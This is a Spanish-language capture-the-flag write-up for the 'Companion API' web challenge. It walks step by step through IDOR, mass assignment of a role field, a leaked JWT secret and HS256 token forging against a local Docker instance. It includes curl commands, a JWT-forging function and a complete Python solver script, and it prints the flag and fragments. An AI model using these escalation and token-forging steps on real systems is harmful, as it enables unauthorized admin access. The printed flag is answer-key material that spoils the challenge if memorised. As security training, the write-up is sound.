# 🏆 CTF TALENT ARENA 2026 — Companion API Writeup

## Challenge Info

| Campo | Valor |
|-------|-------|
| **Nombre** | Companion API |
| **Categoría** | Web |
| **Evento** | TALENT ARENA 2026 (MWC Barcelona) |
| **Flag** | `MWC{ed3d78febdaef5198869e9a27b873f1a}` |
| **Técnicas** | IDOR, Mass Assignment, JWT Forging, Privilege Escalation |
| **Stack** | Go (Chi router), JWT HS256, Docker (distroless) |

---

## 📋 Resumen Ejecutivo

El reto consiste en una API REST (`companion-api`) desplegada en Docker que requiere encontrar **3 fragmentos** ocultos tras distintas vulnerabilidades y enviarlos a un endpoint `/api/v1/finalize` para obtener la flag.

La cadena de ataque completa es:

```
Login → IDOR (Fragment 1) → Mass Assignment (escalada a staff) → 
Re-login → Fragment 2 + JWT Secret leak → JWT Forging (admin) → 
Fragment 3 → Finalize → FLAG
```

**Clave crítica**: Los fragmentos 2 y 3 están vinculados al `sub` (subject) del JWT. Todos los fragmentos deben pertenecer al **mismo usuario** para que el endpoint `/finalize` los acepte.

---

## 🔧 Setup Inicial

### Despliegue del contenedor

```bash
cd web-challenge/web-challenge/
docker compose up -d
# API disponible en http://127.0.0.1:8080
```

### Reconocimiento inicial

```bash
# Página principal revela credenciales demo
curl -s http://127.0.0.1:8080/

# Resultado: muestra login con demo@companion.local / demo
```

La landing page del servicio expone unas credenciales de demostración:

- **Email**: `demo@companion.local`
- **Password**: `demo`

También se descubre el endpoint `/.well-known/app.json` y `/api/v1/health`.

---

## 🔑 Paso 1: Login y Obtención del JWT

```bash
curl -s -X POST http://127.0.0.1:8080/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"demo@companion.local","password":"demo"}'
```

**Respuesta:**
```json
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1LWRlbW8tMmE3YjNjNGQiLCJlbWFpbCI6ImRlbW9AY29tcGFuaW9uLmxvY2FsIiwicm9sZSI6InVzZXIiLC...",
  "token_type": "Bearer",
  "expires_in": 3600
}
```

**JWT decodificado:**
```json
{
  "sub": "u-demo-2a7b3c4d",
  "email": "demo@companion.local",
  "role": "user",
  "iat": 1770409465,
  "exp": 1770413065
}
```

Observaciones:
- El algoritmo es **HS256** (clave simétrica)
- El `sub` identifica al usuario: `u-demo-2a7b3c4d`
- El `role` es `user` (sin privilegios especiales)

---

## 🔓 Paso 2: IDOR — Fragment 1

### Vulnerabilidad: Insecure Direct Object Reference

El endpoint `/api/v1/tickets/{id}` permite acceder a tickets de **cualquier usuario** sin verificar la propiedad del recurso.

```bash
# Fuzzear ticket IDs del 2000 al 2010
for i in $(seq 2000 2010); do
  curl -s http://127.0.0.1:8080/api/v1/tickets/$i \
    -H "Authorization: Bearer $TOKEN"
done
```

**Ticket 2003 (pertenece a staff):**
```json
{
  "ticket_id": 2003,
  "owner_user_id": "u-staff-5e6f7a8b",
  "title": "Staff Backstage Pass",
  "status": "approved",
  "meta": {
    "owner_role": "staff",
    "fragment_1": "zWSPcwMG3Y1M",
    "links": [
      {
        "rel": "internal",
        "href": "/api/v1/dev/panel"
      }
    ]
  }
}
```

### 🧩 Fragment 1: `zWSPcwMG3Y1M`

**Hallazgos adicionales:**
- Se descubre el endpoint oculto `/api/v1/dev/panel`
- Se identifica el usuario staff: `u-staff-5e6f7a8b`
- Los tickets 2000-2010 contienen fragmentos distintos pero cualquiera del ticket 2003 es válido (como indica la descripción del reto: `<FRAGMENT_2003>`)

---

## ⚡ Paso 3: Mass Assignment — Escalada a Staff

### Vulnerabilidad: Mass Assignment en PATCH /api/v1/users/me

El endpoint `PATCH /api/v1/users/me` permite modificar **cualquier campo** del usuario, incluyendo el campo `role` que debería estar protegido.

```bash
curl -s -X PATCH http://127.0.0.1:8080/api/v1/users/me \
  -H "Authorization: Bearer $USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role": "staff"}'
```

**Respuesta:**
```json
{
  "id": "u-demo-2a7b3c4d",
  "email": "demo@companion.local",
  "role": "staff"
}
```

El servidor acepta el cambio de `role` de `user` a `staff` sin ninguna validación de autorización.

### Re-login para obtener JWT legítimo con rol staff

```bash
curl -s -X POST http://127.0.0.1:8080/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"demo@companion.local","password":"demo"}'
```

**Nuevo JWT decodificado:**
```json
{
  "sub": "u-demo-2a7b3c4d",
  "email": "demo@companion.local",
  "role": "staff",
  "iat": 1770409470,
  "exp": 1770413070
}
```

> ⚠️ **PUNTO CRÍTICO**: El `sub` sigue siendo `u-demo-2a7b3c4d` (nuestro usuario demo). Esto es esencial porque los fragmentos 2 y 3 se calculan en base al `sub` del token. Si forjáramos un token con `sub: u-staff-5e6f7a8b`, obtendríamos fragmentos diferentes que no coincidirían a la hora de validar.

---

## 🔑 Paso 4: Fragment 2 + Leak del JWT Secret

### Acceso al Dev Panel (requiere rol staff)

```bash
curl -s http://127.0.0.1:8080/api/v1/dev/panel \
  -H "Authorization: Bearer $STAFF_TOKEN"
```

**Respuesta:**
```json
{
  "message": "Dev panel (internal)",
  "fragment_2": "lYE3tlwIp_Mk",
  "links": [
    {
      "rel": "jwt",
      "href": "/api/v1/dev/jwt"
    }
  ]
}
```

### 🧩 Fragment 2: `lYE3tlwIp_Mk`

> **Nota**: Este fragmento es `lYE3tlwIp_Mk` porque nuestro `sub` es `u-demo-2a7b3c4d`. Si usáramos un token forjado con `sub: u-staff-5e6f7a8b`, obtendríamos `-OP-Zgl7JabT` en su lugar — un fragmento distinto que **no** funcionaría con los demás.

### Leak del JWT Signing Key

El dev panel también revela un link a `/api/v1/dev/jwt`:

```bash
curl -s http://127.0.0.1:8080/api/v1/dev/jwt \
  -H "Authorization: Bearer $STAFF_TOKEN"
```

**Respuesta:**
```json
{
  "alg": "HS256",
  "signing_key": "dev-jwt-secret-do-not-use-in-production",
  "note": "internal diagnostics"
}
```

### 🔐 JWT Secret: `dev-jwt-secret-do-not-use-in-production`

Con esta clave podemos **forjar cualquier JWT válido**.

---

## 👑 Paso 5: JWT Forging — Escalada a Admin

### ¿Por qué no usar Mass Assignment para admin?

La mass assignment solo permite escalar hasta `staff`. Intentar `{"role": "admin"}` es aceptado por el PATCH pero el servidor **ignora el cambio** — el re-login sigue devolviendo `role: staff`.

### Forjar JWT con rol admin y MISMO sub

```python
import json, time, base64, hmac, hashlib

JWT_SECRET = "dev-jwt-secret-do-not-use-in-production"

def b64url_encode(data):
    if isinstance(data, str): data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

now = int(time.time())
header = {"alg": "HS256", "typ": "JWT"}
payload = {
    "sub": "u-demo-2a7b3c4d",        # ← MISMO sub que nuestro usuario
    "email": "demo@companion.local",
    "role": "admin",                   # ← Escalado a admin
    "iat": now,
    "exp": now + 3600
}

hb = b64url_encode(json.dumps(header, separators=(",", ":")))
pb = b64url_encode(json.dumps(payload, separators=(",", ":")))
msg = f"{hb}.{pb}"
sig = hmac.new(JWT_SECRET.encode(), msg.encode(), hashlib.sha256).digest()
admin_token = f"{msg}.{b64url_encode(sig)}"
```

> ⚠️ **CLAVE DEL RETO**: El `sub` en el JWT forjado **DEBE ser `u-demo-2a7b3c4d`** (nuestro usuario real). Si usamos `u-admin-9c0d1e2f` (el sub del admin real), los fragmentos serían calculados con un seed distinto y el `/finalize` los rechazaría.

---

## 🔑 Paso 6: Fragment 3 — Admin Console

```bash
curl -s http://127.0.0.1:8080/api/v1/admin/console \
  -H "Authorization: Bearer $ADMIN_TOKEN"
```

**Respuesta:**
```json
{
  "banner": "Admin Console",
  "fragment_3": "3bvyvMCM0StL"
}
```

### 🧩 Fragment 3: `3bvyvMCM0StL`

> Este fragmento es `3bvyvMCM0StL` (sub: `u-demo-2a7b3c4d`). Con el sub del admin real sería `O5evUB-NNM_e` — **diferente e incompatible**.

---

## 🏁 Paso 7: Finalize — Obtener la Flag

### Enviar los 3 fragmentos

```bash
curl -s -X POST http://127.0.0.1:8080/api/v1/finalize \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "fragment_1": "zWSPcwMG3Y1M",
    "fragment_2": "lYE3tlwIp_Mk",
    "fragment_3": "3bvyvMCM0StL"
  }'
```

**Respuesta:**
```json
{
  "flag": "MWC{ed3d78febdaef5198869e9a27b873f1a}"
}
```

### 🚩 FLAG: `MWC{ed3d78febdaef5198869e9a27b873f1a}`

---

## 🧠 Análisis Técnico Profundo

### ¿Cómo se calculan los fragmentos?

El análisis del binario Go (mediante `objdump`) reveló la lógica interna:

```
computeFragment(seed, formattedString):
    mac = HMAC-SHA256(key=seed, message=formattedString)
    result = base64url_encode(mac)
    return result[:12]   // truncar a 12 caracteres
```

Las format strings son:
| Fragment | Format String | Ejemplo (seed=S, ticketID=2003) |
|----------|--------------|--------------------------------|
| Fragment 1 | `f1%d%s` | `f12003<seed>` |
| Fragment 2 | `f2%sstaff` | `f2<seed>staff` |
| Fragment 3 | `f3%sadmin` | `f3<seed>admin` |

El **seed** se deriva del `sub` del JWT del usuario que hace la petición. Esto explica por qué:
- Tokens con diferente `sub` generan fragmentos distintos
- Todos los fragmentos deben venir del **mismo `sub`** para ser coherentes

### ¿Por qué el finalize rechazaba fragmentos mezclados?

El endpoint `HandleFinalize`:

1. Extrae el `sub` del JWT de la request
2. Recalcula los 3 fragmentos esperados usando ese `sub` como parte del seed
3. Compara con `constantTimeEqual` (previene timing attacks)
4. Si **los tres** coinciden → devuelve la flag
5. Si **cualquiera** falla → `{"error": "invalid_fragments"}`

Cuando usábamos fragmentos de distintos `sub` (ej: f1 de cualquier ticket, f2 con `u-staff-5e6f7a8b`, f3 con `u-admin-9c0d1e2f`), el servidor recalculaba con **un solo `sub`** y ninguno coincidía.

### El rol del `isValidFragment1`

La función `isValidFragment1` (en `0x6af6c0`) es especial: itera los ticket IDs del 2000 al 2010 y acepta el fragment_1 de **cualquiera** de ellos. Esto es porque fragment_1 se obtiene por IDOR y el servidor no sabe cuál ticket específico leímos — pero el seed sigue derivándose del `sub` del usuario en la request.

---

## 📊 Mapa de Endpoints

| Endpoint | Método | Auth | Descripción |
|----------|--------|------|-------------|
| `/api/v1/auth/login` | POST | ❌ | Login, devuelve JWT |
| `/api/v1/users/me` | GET | ✅ user | Info del usuario actual |
| `/api/v1/users/me` | PATCH | ✅ user | **Mass Assignment** (cambiar role) |
| `/api/v1/tickets/{id}` | GET | ✅ user | **IDOR** — cualquier ticket |
| `/api/v1/dev/panel` | GET | ✅ staff | Fragment 2 |
| `/api/v1/dev/jwt` | GET | ✅ staff | **Leak del JWT secret** |
| `/api/v1/admin/console` | GET | ✅ admin | Fragment 3 |
| `/api/v1/finalize` | POST | ✅ any | Validar fragmentos → Flag |
| `/api/v1/health` | GET | ❌ | Health check |
| `/.well-known/app.json` | GET | ❌ | Metadata de la app |

---

## 🔗 Cadena de Vulnerabilidades

```
┌─────────────────────────────────────────────────────────────────┐
│                    COMPANION API — ATTACK CHAIN                 │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. LOGIN (demo@companion.local / demo)                         │
│     └─→ JWT con role=user, sub=u-demo-2a7b3c4d                  │
│                                                                 │
│  2. IDOR en /tickets/{id}                                       │
│     └─→ Ticket 2003: fragment_1 = zWSPcwMG3Y1M                  │
│     └─→ Descubre /api/v1/dev/panel                              │
│                                                                 │
│  3. MASS ASSIGNMENT en PATCH /users/me                          │
│     └─→ {"role": "staff"} → Escalada de privilegios             │
│     └─→ Re-login → JWT legítimo con role=staff                  │
│         (sub sigue siendo u-demo-2a7b3c4d) ← CLAVE             │
│                                                                 │
│  4. ACCESO A DEV PANEL (staff)                                  │
│     └─→ fragment_2 = lYE3tlwIp_Mk (vinculado a nuestro sub)    │
│     └─→ Descubre /api/v1/dev/jwt                                │
│                                                                 │
│  5. JWT SECRET LEAK en /dev/jwt                                 │
│     └─→ signing_key = dev-jwt-secret-do-not-use-in-production   │
│                                                                 │
│  6. JWT FORGING (admin)                                         │
│     └─→ Forjar JWT: role=admin, sub=u-demo-2a7b3c4d ← CLAVE    │
│                                                                 │
│  7. ACCESO A ADMIN CONSOLE                                      │
│     └─→ fragment_3 = 3bvyvMCM0StL (vinculado a nuestro sub)    │
│                                                                 │
│  8. FINALIZE                                                    │
│     └─→ POST {f1, f2, f3} → FLAG: MWC{ed3d78febdaef5198...}    │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 🐍 Script Completo de Solución

```python
#!/usr/bin/env python3
"""
Companion API CTF Solver — TALENT ARENA 2026
Flag: MWC{ed3d78febdaef5198869e9a27b873f1a}
"""

import requests, json, time, base64, hmac, hashlib

BASE = "http://127.0.0.1:8080"
s = requests.Session()

def b64url_encode(data):
    if isinstance(data, str): data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def decode_jwt(token):
    parts = token.split(".")
    return json.loads(base64.urlsafe_b64decode(parts[1] + "=="))

def make_jwt(secret, sub, email, role):
    now = int(time.time())
    header = {"alg": "HS256", "typ": "JWT"}
    payload = {"sub": sub, "email": email, "role": role, "iat": now, "exp": now + 3600}
    hb = b64url_encode(json.dumps(header, separators=(",", ":")))
    pb = b64url_encode(json.dumps(payload, separators=(",", ":")))
    msg = f"{hb}.{pb}"
    sig = hmac.new(secret.encode(), msg.encode(), hashlib.sha256).digest()
    return f"{msg}.{b64url_encode(sig)}"

# --- Step 1: Login ---
print("[1] Login as demo user...")
r = s.post(f"{BASE}/api/v1/auth/login",
           json={"email": "demo@companion.local", "password": "demo"})
token = r.json()["access_token"]
jwt_data = decode_jwt(token)
my_sub = jwt_data["sub"]
print(f"    sub={my_sub}, role={jwt_data['role']}")

# --- Step 2: IDOR → Fragment 1 ---
print("[2] IDOR: Reading ticket 2003...")
r = s.get(f"{BASE}/api/v1/tickets/2003",
          headers={"Authorization": f"Bearer {token}"})
f1 = r.json()["meta"]["fragment_1"]
print(f"    fragment_1 = {f1}")

# --- Step 3: Mass Assignment → Staff ---
print("[3] Mass Assignment: Escalating to staff...")
s.patch(f"{BASE}/api/v1/users/me",
        headers={"Authorization": f"Bearer {token}", "Content-Type": "application/json"},
        json={"role": "staff"})

print("    Re-logging in for legitimate staff JWT...")
r = s.post(f"{BASE}/api/v1/auth/login",
           json={"email": "demo@companion.local", "password": "demo"})
staff_token = r.json()["access_token"]
print(f"    role={decode_jwt(staff_token)['role']}, sub={decode_jwt(staff_token)['sub']}")

# --- Step 4: Dev Panel → Fragment 2 ---
print("[4] Accessing dev panel...")
r = s.get(f"{BASE}/api/v1/dev/panel",
          headers={"Authorization": f"Bearer {staff_token}"})
f2 = r.json()["fragment_2"]
print(f"    fragment_2 = {f2}")

# --- Step 5: JWT Secret Leak ---
print("[5] Leaking JWT secret...")
r = s.get(f"{BASE}/api/v1/dev/jwt",
          headers={"Authorization": f"Bearer {staff_token}"})
jwt_secret = r.json()["signing_key"]
print(f"    signing_key = {jwt_secret}")

# --- Step 6: Forge Admin JWT (same sub!) ---
print("[6] Forging admin JWT with same sub...")
admin_token = make_jwt(jwt_secret, my_sub, "demo@companion.local", "admin")
print(f"    Forged: role=admin, sub={my_sub}")

# --- Step 7: Admin Console → Fragment 3 ---
print("[7] Accessing admin console...")
r = s.get(f"{BASE}/api/v1/admin/console",
          headers={"Authorization": f"Bearer {admin_token}"})
f3 = r.json()["fragment_3"]
print(f"    fragment_3 = {f3}")

# --- Step 8: Finalize ---
print("[8] Submitting fragments...")
r = s.post(f"{BASE}/api/v1/finalize",
           headers={"Authorization": f"Bearer {admin_token}",
                     "Content-Type": "application/json"},
           json={"fragment_1": f1, "fragment_2": f2, "fragment_3": f3})
print(f"    Status: {r.status_code}")
print(f"    Response: {r.text}")

if r.status_code == 200:
    flag = r.json().get("flag")
    print(f"\n{'='*50}")
    print(f"  🚩 FLAG: {flag}")
    print(f"{'='*50}")
```

---

## 📝 Lecciones Aprendidas

### Vulnerabilidades explotadas

1. **IDOR (CWE-639)**: Acceso directo a objetos de otros usuarios vía IDs predecibles.
2. **Mass Assignment (CWE-915)**: El endpoint PATCH acepta campos privilegiados (`role`) sin validación.
3. **Sensitive Data Exposure (CWE-200)**: El JWT signing key se expone en `/dev/jwt`.
4. **Broken Access Control (CWE-284)**: Combinación de las anteriores permite escalar de `user` → `staff` → `admin`.

### El truco más sutil

La trampa del reto es que **forjar un JWT con el `sub` de otro usuario** (como `u-staff-5e6f7a8b` o `u-admin-9c0d1e2f`) genera fragmentos válidos individualmente, pero **incoherentes entre sí**. El endpoint `/finalize` recalcula los fragmentos esperados con el `sub` del token de la request, por lo que **todos deben corresponder al mismo usuario**.

La solución correcta es:
1. Usar Mass Assignment para que **nuestro propio usuario** sea staff
2. Obtener fragmentos con **nuestro `sub` real** (`u-demo-2a7b3c4d`)
3. Forjar el admin JWT manteniendo **nuestro mismo `sub`**

Esto asegura coherencia entre los 3 fragmentos y el `sub` del token usado en `/finalize`.

---

*Writeup por: CTF-TALENT-ARENA solver — Febrero 2026*